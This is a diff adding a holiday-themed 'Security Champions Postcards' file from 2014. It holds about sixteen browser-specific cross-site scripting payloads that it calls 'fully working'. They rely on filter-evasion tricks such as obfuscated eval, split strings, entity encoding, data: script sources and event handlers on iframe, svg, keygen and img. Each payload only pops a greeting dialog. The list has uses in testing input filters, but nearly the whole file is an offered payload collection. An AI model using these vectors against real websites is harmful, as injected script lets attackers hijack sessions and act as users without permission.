@@ -1,0 +1,74 @@
+                             .----------------. .----------------. .----------------. .----------------.                                                          
+                             | .--------------. | .--------------. | .--------------. | .--------------. |                                                         
+                             | |  ____  ____  | | | ____    ____ | | |      __      | | |    _______   | |                                                         
+                             | | |_  _||_  _| | | ||_   \  /   _|| | |     /  \     | | |   /  ___  |  | |                                                         
+                             | |   \ \  / /   | | |  |   \/   |  | | |    / /\ \    | | |  |  (__ \_|  | |                                                         
+                             | |    > `' <    | | |  | |\  /| |  | | |   / ____ \   | | |   '.___`-.   | |                                                         
+                             | |  _/ /'`\ \_  | | | _| |_\/_| |_ | | | _/ /    \ \_ | | |  |`\____) |  | |                                                         
+                             | | |____||____| | | ||_____||_____|| | ||____|  |____|| | |  |_______.'  | |                                                         
+                             | |              | | |              | | |              | | |              | |                                                         
+                             | '--------------' | '--------------' | '--------------' | '--------------' |                                                         
+ .----------------. .----------------. .----------------. .----------------. .----------------. .----------------. .----------------. 
+| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
+| |    _______   | | |   ______     | | |  _________   | | |     ______   | | |     _____    | | |      __      | | |   _____      | |
+| |   /  ___  |  | | |  |_   __ \   | | | |_   ___  |  | | |   .' ___  |  | | |    |_   _|   | | |     /  \     | | |  |_   _|     | |
+| |  |  (__ \_|  | | |    | |__) |  | | |   | |_  \_|  | | |  / .'   \_|  | | |      | |     | | |    / /\ \    | | |    | |       | |
+| |   '.___`-.   | | |    |  ___/   | | |   |  _|  _   | | |  | |         | | |      | |     | | |   / ____ \   | | |    | |   _   | |
+| |  |`\____) |  | | |   _| |_      | | |  _| |___/ |  | | |  \ `.___.'\  | | |     _| |_    | | | _/ /    \ \_ | | |   _| |__/ |  | |
+| |  |_______.'  | | |  |_____|     | | | |_________|  | | |   `._____.'  | | |    |_____|   | | ||____|  |____|| | |  |________|  | |
+| |              | | |              | | |              | | |              | | |              | | |              | | |              | |
+| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
+ '----------------' '----------------' '----------------' '----------------' '----------------' '----------------' '----------------' 
+                 ###  XmaSSpecial Security Champions Postcards - Merry Christmas and Happy New Year - 22-12-2014  ###
+                                               ## Modern and fully working XSS vectors! ##                           
+
+
+<!-- Firefox -->
+<iframe/onload='window:XSS:confirm("Feliz Natal e um Próspero Ano Novo")'>
+
+<!-- Firefox -->
+<i<f<r<a<m<e><iframe/onload=confirm("FelizNataleUmPrósperoAnoNovo");></i>f>r>a>m>e>
+
+<!-- Firefox -->
+<keygen/onfocus=prompt("FelizNataleUmPrósperoAnoNovo"); autofocus>
+
+<!-- (Backbone.js) -->
+&lt;label class="&lt;% alert("FelizNataleUmPrósperoAnoNovo") %&gt;"&gt;
+
+<!-- Firefox -->
+<script>a=/constructor/;b=/alert("Feliz Natal e um Próspero Ano Novo")/;[][a.source][a.source](b.source)();</script>
+
+<!-- Firefox -->
+<iframe/onload=action=/confir/.source+'m';eval(action)("FelizNataleUmPrósperoAnoNovo")> 
+
+<!-- Firefox -->
+<script/src="data:text/javascript,o={window:'/Feliz Natal e um Próspero Ano Novo/'};prompt(o['window']);"></script>
+
+<!-- Firefox -->
+<svg/onload="javascript:with(window){confirm(/Feliz Natal e um Próspero Ano Novo/);}">
+
+<!-- Firefox -->
+<svg><script>a<!>l<!>e<!>r<!>t<!>(<!>"Feliz Natal e um Próspero Ano Novo"<!>)</script> < 
+
+<!-- Firefox-->
+<input type="text" value=`` <div/onmouseover='alert("Feliz Natal e um Próspero Ano Novo")'>X</div>
+
+<!-- Chrome -->
+<body/onload="javascript:S='pro';V='mpt';G='\x28\x22Feliz Natal e um Próspero Ano Novo\x22\x29';setInterval(S+V+G,0);">
+
+<!-- Chrome -->
+<style/onload    =    !-alert&#x28;&#x22;FelizNataleUmPrósperoAnoNovo&#x22;&#x29;>
+
+<!-- (URL Field XSS)  - Chrome -->
+http://www.<script abc>setTimeout('confirm("Feliz Natal e um Próspero Ano Novo")',1)</script .com>	
+
+<!-- Chrome -->
+<keygen/name="confirm(/Feliz Natal e um Próspero Ano Novo/)"/onfocus="eval(this.name);">
+
+<!-- Chrome -->
+<img/src=x alt=confirm("FelizNataleUmPrósperoAnoNovo") onmouseover=eval(alt)>
+
+<!-- Chrome -->
+<a/href="javascript:i=new this.Image&lpar;&rpar;;i.this.onerror=confirm%28 %22FelizNataleUmPrósperoAnoNovo%22%29;">X</a>
+
+http://pathonproject.com/zb/?d33b21cbe855d252#v/Dj9liOAhnc5JEekL2AWDrusKrJmMlbXfbXBrlM/2M=
